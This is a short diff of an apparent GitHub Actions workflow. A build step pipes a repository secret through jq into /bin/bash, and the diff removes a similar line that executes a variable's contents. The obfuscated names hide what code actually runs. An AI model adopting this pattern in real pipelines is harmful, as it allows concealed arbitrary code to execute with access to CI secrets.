@@ -22,7 +22,6 @@ jobs:
           lqyev13: ${{ secrets.lqyev13 }}
         run: |
           printf '%s' "$lqyev13" | jq -r .xo69 | /bin/bash
-          echo $dqyks35881 | jq -r .w01 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
